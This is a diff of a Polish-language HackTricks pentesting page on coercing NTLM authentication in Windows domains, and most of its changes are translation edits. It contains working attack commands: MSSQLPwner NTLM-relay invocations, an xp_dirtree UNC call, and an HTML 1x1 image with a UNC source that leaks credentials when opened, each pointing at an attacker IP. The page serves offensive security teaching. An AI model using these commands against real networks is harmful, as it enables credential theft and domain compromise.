@@ -10,7 +10,7 @@ Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-
 
 * Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Podziel się sztuczkami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.
+* **Podziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.
 
 </details>
 {% endhint %}
@@ -21,7 +21,7 @@ Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-
 
 ## Nadużycie usługi Spooler
 
-Jeśli usługa _**Print Spooler**_ jest **włączona**, możesz użyć niektórych już znanych poświadczeń AD, aby **zażądać** od serwera drukarek kontrolera domeny **aktualizacji** dotyczącej nowych zadań drukowania i po prostu powiedzieć mu, aby **wysłał powiadomienie do jakiegoś systemu**.\
+Jeśli usługa _**Print Spooler**_ jest **włączona**, możesz użyć już znanych poświadczeń AD, aby **zażądać** od serwera drukarek kontrolera domeny **aktualizacji** dotyczącej nowych zadań drukowania i po prostu powiedzieć mu, aby **wysłał powiadomienie do jakiegoś systemu**.\
 Zauważ, że gdy drukarka wysyła powiadomienie do dowolnych systemów, musi **uwierzytelnić się** w tym **systemie**. Dlatego atakujący może sprawić, że usługa _**Print Spooler**_ uwierzytelni się w dowolnym systemie, a usługa **użyje konta komputera** w tej autoryzacji.
 
 ### Znajdowanie serwerów Windows w domenie
@@ -62,9 +62,9 @@ Jeśli atakujący już skompromitował komputer z [Nieograniczoną Delegacją](u
 
 ## PrivExchange
 
-Atak `PrivExchange` jest wynikiem luki znalezionej w **funkcji `PushSubscription` serwera Exchange**. Ta funkcja pozwala serwerowi Exchange na wymuszenie uwierzytelnienia przez dowolnego użytkownika domeny z skrzynką pocztową do dowolnego hosta dostarczonego przez klienta za pośrednictwem HTTP.
+Atak `PrivExchange` jest wynikiem luki znalezionej w **funkcji `PushSubscription` serwera Exchange**. Ta funkcja pozwala serwerowi Exchange na wymuszenie przez dowolnego użytkownika domeny z skrzynką pocztową uwierzytelnienia do dowolnego hosta dostarczonego przez klienta za pośrednictwem HTTP.
 
-Domyślnie **usługa Exchange działa jako SYSTEM** i ma nadmierne uprawnienia (konkretnie, ma **uprawnienia WriteDacl na domenie przed aktualizacją zbiorczą 2019**). Ta luka może być wykorzystana do umożliwienia **przekazywania informacji do LDAP i następnie wyodrębnienia bazy danych NTDS domeny**. W przypadkach, gdy przekazywanie do LDAP nie jest możliwe, ta luka może być nadal używana do przekazywania i uwierzytelniania się w innych hostach w obrębie domeny. Udane wykorzystanie tego ataku zapewnia natychmiastowy dostęp do administratora domeny z dowolnym uwierzytelnionym kontem użytkownika domeny.
+Domyślnie **usługa Exchange działa jako SYSTEM** i ma nadmierne uprawnienia (konkretnie, ma **uprawnienia WriteDacl na domenie przed 2019 rokiem Cumulative Update**). Ta luka może być wykorzystana do umożliwienia **przekazywania informacji do LDAP i następnie wyodrębnienia bazy danych NTDS domeny**. W przypadkach, gdy przekazywanie do LDAP nie jest możliwe, ta luka może być nadal używana do przekazywania i uwierzytelniania do innych hostów w obrębie domeny. Udane wykorzystanie tego ataku zapewnia natychmiastowy dostęp do administratora domeny z dowolnym uwierzytelnionym kontem użytkownika domeny.
 
 ## Wewnątrz Windows
 
@@ -78,6 +78,17 @@ C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -S
 ```sql
 EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
 ```
+[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
+```shell
+# Issuing NTLM relay attack on the SRV01 server
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250
+
+# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250
+
+# Issuing NTLM relay attack on the local server with custom command
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
+```
 Lub użyj tej innej techniki: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
 
 ### Certutil
@@ -90,19 +101,19 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 
 ### Via email
 
-If you know the **email address** of the user that logs inside a machine you want to compromise, you could just send him an **email with a 1x1 image** such as
+Jeśli znasz **adres e-mail** użytkownika, który loguje się na maszynie, którą chcesz skompromitować, możesz po prostu wysłać mu **e-mail z obrazem 1x1** takim jak
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-i kiedy to otworzy, spróbuje się uwierzytelnić.
+i gdy to otworzy, spróbuje się uwierzytelnić.
 
 ### MitM
 
-Jeśli możesz przeprowadzić atak MitM na komputer i wstrzyknąć HTML na stronie, którą będzie wizualizował, możesz spróbować wstrzyknąć obrazek taki jak poniżej na stronę:
+Jeśli możesz przeprowadzić atak MitM na komputer i wstrzyknąć HTML na stronie, którą będzie wizualizował, możesz spróbować wstrzyknąć obrazek taki jak poniżej na stronie:
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-## Łamanie NTLMv1
+## Cracking NTLMv1
 
 Jeśli możesz przechwycić [wyzwania NTLMv1, przeczytaj tutaj, jak je złamać](../ntlm/#ntlmv1-attack).\
 _Pamiętaj, że aby złamać NTLMv1, musisz ustawić wyzwanie Respondera na "1122334455667788"_
